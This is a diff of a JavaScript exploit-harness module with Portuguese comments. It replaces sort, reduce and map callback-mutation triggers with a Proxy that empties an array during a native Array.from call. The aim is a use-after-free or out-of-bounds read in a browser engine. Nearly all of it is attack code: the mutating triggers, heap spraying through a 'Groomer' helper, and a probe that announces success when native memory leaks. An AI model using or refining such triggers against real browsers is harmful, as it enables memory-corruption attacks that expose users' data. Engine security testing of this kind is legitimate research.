@@ -1,87 +1,71 @@
-import { GCOracle } from '../mod_executor.js';
+import { Groomer } from '../mod_groomer.js';
 
 export default {
     id:       'NATIVE_CALLBACK_MUTATION_UAF',
     category: 'CoreJS',
     risk:     'HIGH',
     description:
-        'Funções nativas C++ (sort, reduce, map) com callback JS que muta o array. ' +
-        'Atacam o ponteiro de Butterfly cacheado pelo C++ durante iteração. ' +
-        'Variante map() em array Holey testa OOB write quando Butterfly é realocado.',
+        'Abusa do Array.from nativo C++ usando um iterador Proxy. Quando o motor C++ ' +
+        'solicita o próximo valor, o Proxy destrói o array subjacente. Foca na falha ' +
+        'do interpretador em revalidar os ponteiros do Butterfly no meio de uma iteração Proxy.',
 
     setup: function() {
-        this.log = [];
-        this.attacked = { sort: false, reduce: false, map: false };
+        this.results = {};
+        this.vulnArray = [1.1, 2.2, 3.3, 4.4, 5.5];
+        
+        const self = this;
+        this.triggerCount = 0;
+
+        // Criamos um Proxy que atua como um iterador malicioso
+        this.evilIterator = new Proxy(this.vulnArray, {
+            get(target, prop) {
+                if (prop === 'length') return 5;
+                
+                // O C++ vai pedir índices (0, 1, 2...)
+                if (prop === '2') {
+                    // O GATILHO: A meio da iteração nativa, destruímos os dados!
+                    target.length = 0;
+                    
+                    // Lixo imediato no heap para ocupar o espaço livre
+                    let trash = Groomer.sprayDOM('div', 500);
+                }
+                return target[prop];
+            }
+        });
     },
 
     trigger: function() {
-        this.sortArr = Array.from({ length: 60 }, (_, i) => 60.0 - i); 
-        
-        // 🚨 Oráculo: Verifica se o array foi varrido completamente
-        if (GCOracle.registry) {
-            GCOracle.registry.register(this.sortArr, `${this.id}_sortArr`);
+        try {
+            // Array.from é implementado em C++ bruto. Ele vai ler o nosso Proxy
+            // sem saber que a memória pode desaparecer no índice 2.
+            this.results.forgedArray = Array.from(this.evilIterator);
+        } catch(e) {
+            this.results.error = e.message;
         }
-
-        try {
-            this.sortArr.sort((a, b) => {
-                if (!this.attacked.sort) {
-                    this.attacked.sort = true;
-                    this.sortArr.length = 0;
-                    const trash = [];
-                    for (let i = 0; i < 15; i++) trash.push(new ArrayBuffer(512 * 1024));
-                }
-                return a - b;
-            });
-        } catch(e) { this.log.push({ phase: 'sort', err: e.constructor.name }); }
-
-        this.reduceArr = Array.from({ length: 40 }, (_, i) => i * 1.1);
-        try {
-            this.reduceArr.reduce((acc, val, idx) => {
-                if (!this.attacked.reduce && idx === 10) {
-                    this.attacked.reduce = true;
-                    for (let i = 0; i < 1000; i++) this.reduceArr.push(i * 2.2);
-                }
-                return acc + val;
-            }, 0);
-        } catch(e) { this.log.push({ phase: 'reduce', err: e.constructor.name }); }
-
-        this.mapArr = [1.1, 2.2, 3.3];
-        this.mapArr[200] = 4.4; 
-        try {
-            this.mapResult = this.mapArr.map((val, idx) => {
-                if (!this.attacked.map && idx === 1) {
-                    this.attacked.map = true;
-                    this.mapArr.length = 0;
-                    this.mapArr.push(...Array(5).fill(99.9));
-                }
-                return val * 2;
-            });
-        } catch(e) { this.log.push({ phase: 'map', err: e.constructor.name }); }
     },
 
     probe: [
-        s => s.sortArr.length,        
-        s => s.sortArr[0],            
-        s => s.sortArr[59],
-        s => typeof s.sortArr[0],
-        s => s.reduceArr.length,      
-        s => s.reduceArr[0],
-        s => s.reduceArr[39],         
-        s => s.reduceArr[1039],       
-        s => s.mapArr.length,         
-        s => s.mapArr[0],
-        s => s.mapResult?.length,     
-        s => s.mapResult?.[0],        
-        s => s.mapResult?.[200],      
-        s => s.log.length,
-        s => s.log.map(e => e.phase + ':' + e.err).join(',') || 'none',
-        s => Object.values(s.attacked).filter(Boolean).length, 
+        // Probe 0: O tamanho do array forjado
+        s => s.results.forgedArray ? s.results.forgedArray.length : 'Falhou',
+        
+        // Probe 1: O Leitor de OOB/UAF
+        s => {
+            if (s.results.forgedArray) {
+                // O C++ deveria ter preenchido com 'undefined' após o array encolher.
+                // Se no índice 3 ou 4 houver números reais (ou lixo C++), é Info Leak!
+                let val = s.results.forgedArray[3];
+                if (typeof val === 'number' && !isNaN(val)) {
+                    return `💥 SUCESSO! OOB Read da Ram Nativa: ${val}`;
+                }
+                return 'Seguro (Preenchido com undefined)';
+            }
+            return s.results.error || 'Erro desconhecido';
+        }
     ],
 
     cleanup: function() {
-        this.sortArr   = null;
-        this.reduceArr = null;
-        this.mapArr    = null;
-        this.mapResult = null;
+        this.vulnArray = null;
+        this.evilIterator = null;
+        this.results = {};
     }
 };
